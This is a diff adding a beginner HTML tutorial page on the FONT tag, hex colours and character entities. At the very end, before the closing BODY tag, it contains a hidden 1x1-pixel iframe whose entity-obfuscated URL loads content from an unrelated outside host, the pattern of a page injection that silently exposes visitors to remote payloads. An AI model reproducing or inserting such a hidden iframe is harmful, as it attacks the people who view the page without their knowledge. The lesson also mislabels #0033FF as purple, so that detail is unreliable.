@@ -1,0 +1,105 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 6: Working with Fonts</TITLE>
+</HEAD>
+
+<BODY>
+
+<H2>Lesson 6: Working with Fonts</H2>
+
+Yeah, HTML is good. We've gotten pretty deep into text control, but there's still more ahead so let's trudge on.<p>
+
+We can control the font in HTML using, what else, the &#60;FONT&#62; tag! We can use the &#60;FONT&#62; tag to control size using the SIZE attribute. The SIZE attribute is used like this:<p>
+
+&#60;FONT SIZE="x"&#62;<BR>
+This text font size x.<BR>
+&#60;/FONT&#62;<p>
+
+Where x is a number, from 1 to 7. The size that the formatted text is depends on the viewers preference settings and screen resolution. Generally though, 1 is really small and 7 is really big. Just in case you're curious, the default font size is 3. There is also a tag called the &#60;BASEFONT&#62; tag, which only can take the SIZE attibute, bute is made to change the size of the text on the entire page.<p>
+
+We can also add color to our text using the &#60;FONT&#62; tag. Color is added to text using, duh, the COLOR attribute to the &#60;FONT&#62; tag. We use the COLOR attribute the same way as the SIZE attribute:<p>
+
+&#60;FONT SIZE="4" COLOR="blue"&#62;<BR>
+This is colorful text in font size 4!<BR>
+&#60;/FONT&#62;<p>
+
+To our page's viewers, it would look like this:<p>
+
+<FONT SIZE="4" COLOR="blue">
+This is colorful text in font size 4!
+</FONT>
+<p>
+
+The COLOR attribute can use these standard colors: black, white, green, red, yellow, blue, aqua, fuchsia, gray, lime, maroon, purple, navy, olive, silver or teal. What? You need more control? Then I suggest you learn the hexadecimal color codes. Hex color codes are used like this:<p>
+
+&#60;FONT COLOR="#0033FF"&#62;<BR>
+This text is purple.<BR>
+&#60;/FONT&#62;<p>
+
+For more information on Hex color codes, I suggest you try <A HREF="http://www.december.com/html/spec/color.html">this site</A>.<p>
+
+The last attribute to &#60;FONT&#62; we'll learn in this lesson is FACE. By defining a font's face, you can control the appearance of that font. The FACE attribute is used like this:<p>
+
+&#60;FONT FACE="arial" size="5" color="blue"&#62;<BR>
+This text is a stunning arial size 5 in blue!<BR>
+&#60;/FONT&#62;<p>
+
+To the viewer, it would look like this:<p>
+
+<FONT FACE="arial" size="5" color="blue">
+This text is a stunning arial size 5 in blue!
+</FONT><p>
+
+Yes, this is great, but there's a catch: for the viewer to see this font change he needs to have the font <i>on his computer</i>. How does it get there? Different computer's come with different font's installed. For example, the Arial font is used on PCs, but Macs use a similar font called Helvetica. We can get around this by asking for backup choices in our FACE attribute. This is done like this:<p>
+
+&#60;FONT FACE="arial,helvetica"&#62;<BR>
+This text is either Arial or Helvetica.<BR>
+&#60;/FONT&#62;
+
+This will show up as arial on computers that have arial installed, or helvetica if they do'nt have arial but do have helvetica. If they do'nt have either, the font does'nt change. However, you can specify as many back up choices as you want.<p>
+
+Yeah, simple text is great, but what if we need to put some special characters into our page? Well, once again HTML to the rescue! The format for this is & followed by the Numeric Code of the special character, or the <i>mnemonic entity</i> of that character, followed by a ;. Here's a list of the important special characters:<p>
+
+<TABLE BORDER="1" ALIGN="center" WIDTH=75%>
+<TR><TH>Character <TH>Numeric Code<TH>Mnemonic Entity<TH>Character Name
+<TR><TD>"         <TD>#34           <TD>quot          <TD>Quotation mark
+<TR><TD>&         <TD>#38          <TD>amp            <TD>Ampersand
+<TR><TD>&#60;      <TD>#60          <TD>lt             <TD>Less Than sign
+<TR><TD>&#62;      <TD>#62          <TD>gt             <TD>Greater Than sign
+<TR><TD>&#162;     <TD>#162         <TD>cent           <TD>Cent sign
+<TR><TD>&#163;     <TD>#163         <TD>pound          <TD>Pound sterling
+<TR><TD>&#166;     <TD>#166         <TD>brkbar         <TD>Broken Vertical bar
+<TR><TD>&#167;     <TD>#167         <TD>sect           <TD>Section sign
+<TR><TD>&#169;     <TD>#169         <TD>copy           <TD>Copyright
+<TR><TD>&#174;     <TD>#174         <TD>reg            <TD>Registered trademark
+<TR><TD>&#176;     <TD>#176         <TD>deg            <TD>Degree sign
+<TR><TD>&#177;     <TD>#177         <TD>plusmn         <TD>Positive or Negative
+<TR><TD>&#178;     <TD>#178         <TD>sup2           <TD>Superscript two
+<TR><TD>&#179;     <TD>#179         <TD>sup3           <TD>Superscript three
+<TR><TD>&#183;     <TD>#183         <TD>middot         <TD>Middle dot
+<TR><TD>&#185;     <TD>#185         <TD>sup1           <TD>Superscript one
+<TR><TD>&#188;     <TD>#188         <TD>frac14         <TD>Fraction one-fourth
+<TR><TD>&#189;     <TD>#189         <TD>frac12         <TD>Fraction one-half
+<TR><TD>&#190;     <TD>#190         <TD>frac34         <TD>Fraction three-fourths
+<TR><TD>&#198;     <TD>#198         <TD>AElig          <TD>Capital AE ligature
+<TR><TD>&#230;      <TD>#230         <TD>aelig          <TD>Small ae ligature
+<TR><TD>&#201;      <TD>#201         <TD>Eacute         <TD>Accented capital E
+<TR><TD>&#233;     <TD>#233         <TD>eacute         <TD>Accented small e
+<TR><TD>&#215;      <TD>#215         <TD>               <TD>Multiply sign
+<TR><TD>&#247;      <TD>#247         <TD>               <TD>Division sign
+</TABLE>
+<p>
+
+I'll be putting up a complete list of these signs on the <A HREF="index.html">main site</A>, so come back and check for it later.<p>
+
+Hey! Here's a little secret: to change the Background color of our web page, simply insert the BGCOLOR attribute into your &#60;BODY&#62; tag. It's used like this:<p>
+
+&#60;BODY BGCOLOR="color or hex number code"&#62;<p>
+
+A little review: How would we put the copyright sign (&#169;) on your website? If you answered & followed immediately by #169;, you're correct! You deserve to go on to the <A HREF="lesson7.html">next lesson</A>! <p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
